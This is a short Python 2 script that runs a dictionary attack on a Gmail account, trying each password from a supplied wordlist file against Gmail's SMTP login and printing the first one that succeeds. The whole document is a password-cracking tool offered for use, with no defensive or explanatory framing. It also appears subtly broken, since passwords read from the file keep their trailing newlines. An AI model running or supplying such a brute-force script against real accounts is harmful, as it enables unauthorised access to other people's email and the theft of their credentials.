import smtplib
smtpserver = smtplib.SMTP('smtp.gmail.com',587)
smtpserver.ehlo()
smtpserver.starttls()
user = raw_input('Enter your email: ')
passfile = raw_input('Enter the pass file name: ')
passfile = open(passfile,'r')

for pwd in passfile:
    try:
        smtpserver.login(user,pwd)
        print('password found: %s' % pwd)
        break
    except smtplib.SMTPAuthenticationError:
        print('password incorrect: %s' % pwd)
